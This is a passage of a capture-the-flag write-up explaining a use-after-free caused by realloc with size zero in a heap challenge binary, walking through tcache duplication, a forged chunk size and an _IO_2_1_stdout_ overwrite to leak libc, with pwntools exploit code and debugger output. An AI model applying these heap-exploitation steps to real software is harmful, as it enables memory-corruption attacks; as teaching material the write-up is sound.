</span></span><span class="line"><span class="cl">      <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Error&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">else</span>
</span></span><span class="line"><span class="cl">  <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nf">puts</span><span class="p">(</span><span class="s">&#34;Memory Error!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="p">}</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="nf">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">^</span> <span class="n">v4</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>Did you saw the catch here? If not, don&rsquo;t worry, I couldn&rsquo;t either at first time, but let&rsquo;s break down the functionality of this function such that the logic of it becomes clear:-</p>
<ul>
<li>First off, this function checks whether the file(chunk), we requested for the edit is in the global arrat <code>directory_file_pointer</code> or not, if it does, proceed.</li>
<li>Then it asks for the <code>size</code>, for which it&rsquo;ll be used to read new content.</li>
<li>The size constraint here also hinted towards the <code>tcache</code> involvement.</li>
<li>Then it does <code>realloc</code> with the size given and second argument being the chunk.</li>
<li>Attempt to read into that extended chunk with the new data we wanted to store.</li>
</ul>
<hr>
<h5 id="vulnerability" class="relative group">Vulnerability <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#vulnerability" aria-label="Anchor">#</a></span></h5><p>The cue for this binary was the <code>edit</code>, pretty expected coming from heap challenge, for most part the vulnerability always seem to have in <code>edit</code> functionality provided by the binary. In this case, the vulerability arises from the use of the function <code>realloc</code>, for this if we refer to man pages, we can see how this was the point of the vulnerability:-</p>
<blockquote>
<p>The  realloc() function changes the size of the memory block pointed to
by ptr to size bytes.  The contents will be unchanged in the range from
the start of the region up to the minimum of the old and new sizes.  If
the new size is larger than the old size, the added memory will not  be
initialized.   If  ptr  is  NULL,  then  the call is equivalent to mal‐
loc(size), for all values of size; if size is equal to zero, and ptr is
not  NULL,  then  the  call  is equivalent to free(ptr).  Unless ptr is
NULL, it must have been returned by an earlier call to  malloc(),  cal‐
loc(),  or realloc().  If the area pointed to was moved, a free(ptr) is
done.</p>
</blockquote>
<p>Did you notice? Yes, calling <code>ralloc(0, &amp;chunk)</code> is basically calling <code>free(&amp;chunk)</code>, this is the cue, we have a <strong>Use After Free</strong> vulnerability in the <code>edit </code>function. Since there&rsquo;s no check for the size being <code>0</code>, as it only checks whether the given size is the within <code>0x70</code> this made the use of <code>realloc</code> function vulnerable here, making this the way to exploit the binary.</p>
<hr>
<p>For this challenge, it would have been lot more easier if we had the GLIBC 2.27 instead of the GLIBC 2.29, since GLIBC 2.27 instroduced the <code>tcache</code> mechanism to a greater range of users and systems, it had quit a lot amount of flaw in the use of <code>tcache</code> which made them suspectible to vulnerabilites like double free, but as the vulnerabilities got reported, this resulted in some major change sin the LIBC 2.29, with the following security mechanism but not only limited to those:-</p>
<ul>
<li>Added checks for the double free which made it harder to propogate this vulnerability.</li>
<li>Increase in assertion check of the size.</li>
<li>Unsorted bin attack is not easy applicable.</li>
</ul>
<p>Although, we don&rsquo;t have to deal with the <strong>Unsorted bin</strong> attack, and with the added checks for the double free, it makes the challenge much more difficult, making for us to bang our heads more than we already been doing.</p>
<p>We have to deal with the checks for the double free, which we will see later on.</p>
<p>The functions responsible for placing and retrieving the chunks out of the <code>tcache</code> are as follows:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="nf">tcache_get</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="nf">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">assert</span> <span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">--</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span> <span class="n">e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="n">__always_inline</span> <span class="kt">void</span>
</span></span><span class="line"><span class="cl"><span class="nf">tcache_put</span> <span class="p">(</span><span class="n">mchunkptr</span> <span class="n">chunk</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">tc_idx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="p">{</span>
</span></span><span class="line"><span class="cl">  <span class="n">tcache_entry</span> <span class="o">*</span><span class="n">e</span> <span class="o">=</span> <span class="p">(</span><span class="n">tcache_entry</span> <span class="o">*</span><span class="p">)</span> <span class="nf">chunk2mem</span> <span class="p">(</span><span class="n">chunk</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">  <span class="nf">assert</span> <span class="p">(</span><span class="n">tc_idx</span> <span class="o">&lt;</span> <span class="n">TCACHE_MAX_BINS</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="cm">/* Mark this chunk as &#34;in the tcache&#34; so the test in _int_free will
</span></span></span><span class="line"><span class="cl"><span class="cm">     detect a double free.  */</span>
</span></span><span class="line"><span class="cl">  <span class="n">e</span><span class="o">-&gt;</span><span class="n">key</span> <span class="o">=</span> <span class="n">tcache</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">  <span class="n">e</span><span class="o">-&gt;</span><span class="n">next</span> <span class="o">=</span> <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">  <span class="n">tcache</span><span class="o">-&gt;</span><span class="n">entries</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]</span> <span class="o">=</span> <span class="n">e</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">  <span class="o">++</span><span class="p">(</span><span class="n">tcache</span><span class="o">-&gt;</span><span class="n">counts</span><span class="p">[</span><span class="n">tc_idx</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></div><p>As you can see, from <a href="https://github.com/D4mianWayne/PwnLand/blob/master/Heap/GLIBC%202.27/tcache-overview.md" target="_blank" rel="noreferrer">this</a> there are no checks for double free, on the other hand, since the target system has the GLIBC 2.29 and above code snippet has a check for double since there&rsquo;s a use of <code>e-&gt;key</code> for the chunk, this made the challenge harder than usual.</p>
<hr>
<p>First off, with the complication of the binary, we will try to do this with the ASLR off, to get the basic understanding of the exploit, then using it as base, we will proceed with it. In order to get over the workflow of heap management, I&rsquo;d advise you to go through following links:-</p>
<ul>
<li><a href="https://github.com/D4mianWayne/PwnLand/blob/master/Heap/GLIBC%202.27/tcache-overview.md" target="_blank" rel="noreferrer">https://github.com/D4mianWayne/PwnLand/blob/master/Heap/GLIBC%202.27/tcache-overview.md</a></li>
<li><a href="https://jjy-security.tistory.com/10&amp;prev=search&amp;pto=aue" target="_blank" rel="noreferrer">https://jjy-security.tistory.com/10&prev=search&pto=aue</a></li>
</ul>
<p>Now, considering you have basic understanding of the tcache management, with that on our skill set, let&rsquo;s move on to write the wrapper functions to interact with the binary&rsquo;s functionalities:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">allocate</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;$ &#34;</span><span class="p">,</span> <span class="s2">&#34;add </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">content</span><span class="p">)</span> <span class="o">==</span> <span class="n">size</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">	<span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">name</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;$ &#34;</span><span class="p">,</span> <span class="s2">&#34;rm </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">realloc</span><span class="p">(</span><span class="n">name</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">content</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;$ &#34;</span><span class="p">,</span> <span class="s2">&#34;edit </span><span class="si">{}</span><span class="s2">&#34;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">name</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">size</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="n">content</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">		<span class="n">p</span><span class="o">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s2">&#34;: &#34;</span><span class="p">,</span> <span class="n">content</span><span class="p">)</span>
</span></span></code></pre></div><p>Now, with this aside, we will now move on the actual exploitation part, I&rsquo;d say pay attention here as much as possible as the initial ideologyof the exploit is very confusing, but as you move on, you&rsquo;ll understand.</p>
<p>For starting, we will allocate and free chunk 1:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><p>Now, this will land into the tcache bin:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/chunk1.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Since, we know that calling <code>realloc(0, chunk)</code> will be just <code>free(chunk)</code>, we will allocate a chunk of size <code>0x68</code> and then do <code>realloc(0, chunk_2)</code> where <code>chunk_2</code> represent the chunk we allocated of size <code>0x68</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">realloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>Doing so,</p>
<p>






  
  
<figure><img src="/img/ropetwo/realloc_free.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>As you can see, it is not removed from the global array which is used to store the information about the allocated chunk and size, located at <code>base + 0x4060</code>. Now, moving on, we re-allocate the same chunk at the index <code>0</code> but we shrink the size from the <code>0x68</code> which was <code>free</code>&rsquo;d earlier, and now we update the size to <code>0x18</code>, then we free it a</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">realloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><p>Now, doing so, we have the same heap chunk at the tcache index 0 as well as on index 5.</p>
<p>






  
  
<figure><img src="/img/ropetwo/dup_entry.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, the same chunk reside in different indices, the reason that happened because first off, we allocated chunk of size <code>0x68</code>, then we <code>free</code>&rsquo;d it with the <code>realloc(0, 0, &quot;&quot;)</code> this <code>free'd</code> the region but the global pointer was not NULL, so when we do <code>realloc(0, 0x18, &quot;A&quot;)</code>, this made the chunk which was <code>free</code>&rsquo;d before, making the <code>free</code>&rsquo;d chunk being used and it ended up being reduced to the size <code>0x18</code>, so when we <code>free</code> it again, the chunk will land into the different index of the <code>tcache</code> bin.</p>
<p>Now, we allocate another chunk of size <code>0x48</code>, then we <code>free</code> it again using the <code>realloc</code>:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">realloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>Doing so, the heap structure turned out to be:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/chunk2.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Then, we <code>realloc</code> the same chunk as of the same size it was allocated to:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">realloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="s2">&#34;B&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><p>Now:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-asm" data-lang="asm"><span class="line"><span class="cl"><span class="nf">gef</span><span class="err">➤</span>  <span class="no">heap</span> <span class="no">bins</span>
</span></span><span class="line"><span class="cl"><span class="err">──────────────────────────────────</span> <span class="nf">Tcachebins</span> <span class="no">for</span> <span class="no">arena</span> <span class="mi">0x7ffff7fbbc40</span> <span class="err">──────────────────────────────────</span>
</span></span><span class="line"><span class="cl"><span class="nf">Tcachebins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x20</span><span class="p">]</span> <span class="no">count</span><span class="err">=</span><span class="mi">1</span>  <span class="err">←</span>  <span class="no">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x5555555592b0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x20</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl"><span class="no">Tcachebins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">3</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x50</span><span class="p">]</span> <span class="no">count</span><span class="err">=</span><span class="mi">3</span>  <span class="err">←</span>  <span class="no">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x5555555592d0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x50</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>  <span class="err">←</span>  <span class="no">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x5555555592d0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x50</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span>  <span class="err">→</span>  <span class="p">[</span><span class="no">loop</span> <span class="no">detected</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">Tcachebins</span><span class="p">[</span><span class="no">idx</span><span class="err">=</span><span class="mi">5</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x70</span><span class="p">]</span> <span class="no">count</span><span class="err">=</span><span class="mi">1</span>  <span class="err">←</span>  <span class="no">Chunk</span><span class="p">(</span><span class="no">addr</span><span class="err">=</span><span class="mi">0x5555555592b0</span><span class="p">,</span> <span class="no">size</span><span class="err">=</span><span class="mi">0x20</span><span class="p">,</span> <span class="no">flags</span><span class="err">=</span><span class="no">PREV_INUSE</span><span class="p">)</span> 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="no">Now</span><span class="p">,</span> <span class="no">the</span> <span class="no">global</span> <span class="no">pointer</span> <span class="no">is</span> <span class="no">also</span> <span class="no">cleared</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nf">gsssef</span><span class="err">➤</span>  <span class="no">x</span><span class="err">/</span><span class="mi">10</span><span class="no">xg</span> <span class="mi">0x0000555555554000</span> <span class="err">+</span> <span class="mi">0x4060</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x555555558060:</span>	<span class="err">0</span><span class="nf">x0000000000000000</span>	<span class="mi">0x0000000000000000</span>
</span></span><span class="line"><span class="cl"><span class="err">0</span><span class="nl">x555555558070:</span>	<span class="err">0</span><span class="nf">x0000000000000000</span>	<span class="mi">0x0000000000000000</span>
</span></span></code></pre></div><p>Playing close attention here, the bin at the index 3, has now an entry pointing to itself, as shown by the <code>gef</code>. This aside, now we will allocate at chunk of size <code>0z48</code> which will be retrieved from the index 3, giving the address <code>0x5555555592d0</code>, since the chunk would still be in the same bin because of the duplicate entry. Now, we will re-allocate a chunk of size <code>0x68</code> at the index <code>1</code>, this will retrieve from the index 5 of the <code>tcache</code> bin list, since the same chunk <code>0x5555555592b0</code> is in two different indices, we write the payload <code>&quot;C&quot;*0x18 + p64(0x451)</code>, As the difference between the chunk at index 3 and index 5 of tcache is <code>0x20</code>, we will overwrite the <code>prev_size</code> to <code>0x451</code>, this made the heap structure like this:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="s2">&#34;C&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;C&#34;</span><span class="o">*</span><span class="mh">0x18</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x451</span><span class="p">))</span>
</span></span></code></pre></div><p>






  
  
<figure><img src="/img/ropetwo/size.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Once we free the chunk, the chunk at the index 1, it&rsquo;ll be:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span></code></pre></div><p>






  
  
<figure><img src="/img/ropetwo/free.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, we need to at least fill a certain index of the <code>tcache</code> bins in such a way that the chunk we <code>free</code> after filling the <code>tcache</code> lands into the fastbin. Now, the way we fill the <code>tcache</code> here is by allocating the chunk at the index 1, and then reallocating the same chunk by extending the size to a much bigger value and then <code>free</code>&lsquo;ing the chunk.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">  <span class="n">allocate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="s2">&#34;D&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="n">realloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="s2">&#34;D&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">  <span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span></code></pre></div><p>Doing so, the <code>tcache</code> bin structure becomes:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/loop.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Then, we allocate a chunk of size <code>0x58</code> which will retrieve the chunk from the <code>tcache bin[3]</code>. Now, what we do here is free the chunk saved at the index 1, then the chunk which was allocated at the index <code>0</code> of the global array, we <code>free</code> it with the <code>realloc</code>, now doing so, since the chunk at that index had the size <code>0x451</code> which is more than the <code>tcache</code> structure can hold, this will make them land into the unsorted bin.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="s2">&#34;A&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">realloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">)</span>
</span></span></code></pre></div><p>Now, doing so, the chunk <code>0x5555555592d0</code> went into the unsorted bin, this chunk remain in the <code>tcache</code> and the <code>unsorted</code> bin:-</p>
<p>






  
  
<figure><img src="/img/ropetwo/unsorted.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, since the chunk belongs to <code>unsorted</code> bin, we can edit the <code>fd</code> and <code>bk</code> of it because of the <strong>Use After Free&amp;</strong>, now then, as there&rsquo;s no show function, we populate the <code>fd</code> of that <code>free</code>&rsquo;d chunk in the <code>_IO_2_1_stdout_</code> and the next time, we allocate the chunk, we will get the structure of the <code>_IO_2_1_stdout_</code> which we will be able to modify.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">realloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="n">p16</span><span class="p">(</span><span class="mh">0xc760</span><span class="p">))</span> <span class="c1"># ASLR disabled</span>
</span></span></code></pre></div><p>






  
  
<figure><img src="/img/ropetwo/stdout.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, we have to allocate chunk carefully since at this point the structure of the heap is not very good, doing anything reckless will mess up the exploit further. Now, what we do is again, allocate a chunk at the index 1, then reallocate the same chunk by shrinking it&rsquo;s size to smaller than it was allocate to, and <code>free</code>&lsquo;ing it, now, when we try to reallocate the chunk 0, to a more smaller size and then <code>free</code> it, doing so, will make the <code>_IO_2_1_stdout_</code> address to the top of the index 3rd of the <code>tcache</code> bin list:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="s2">&#34;E&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">realloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s2">&#34;E&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">realloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x18</span><span class="p">,</span> <span class="s2">&#34;E&#34;</span><span class="o">*</span><span class="mh">0x10</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span></code></pre></div><p>






  
  
<figure><img src="/img/ropetwo/head.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>Now, apparently explaining the structure of the <code>_IO_2_1_stdout_</code> is too much hassle in this already long writeup, so I&rsquo;ll add the references link below for understanding the structure. Now, what we do here is allocate a chuk at the index 0 with the size <code>0x48</code>, which will return the chunk stored from the <code>bin[3]</code>, the given data will be written to the address pointed by the chunk, whhich would look likt his:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">allocate</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x48</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0xfbad1800</span><span class="p">)</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">3</span><span class="p">)</span>
</span></span></code></pre></div><p>






  
  
<figure><img src="/img/ropetwo/io.png" alt="" class="mx-auto my-0 rounded-md" />
</figure>
</p>
<p>After a <code>puts</code> call, there was lot of addresses dumped to the <code>stdout</code>, which was bit too much, this made it hard to get an exact lLIBC leak, this problem was with the ASLR off, which, in turn ran with the bruteforce works perfectly normal.
So, for the ASLR off part, the leak parsing was something like this:-</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">        <span class="n">leak</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mh">0xe20</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)[</span><span class="mh">0xe20</span> <span class="o">+</span> <span class="mh">0x5</span><span class="p">:</span><span class="mh">0xe20</span> <span class="o">+</span> <span class="mh">0x5</span> <span class="o">+</span> <span class="mi">6</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">leak</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;</span><span class="se">\x00</span><span class="s2">&#34;</span><span class="p">))</span> <span class="c1">#+ 0x197a000</span>
</span></span><span class="line"><span class="cl">        <span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
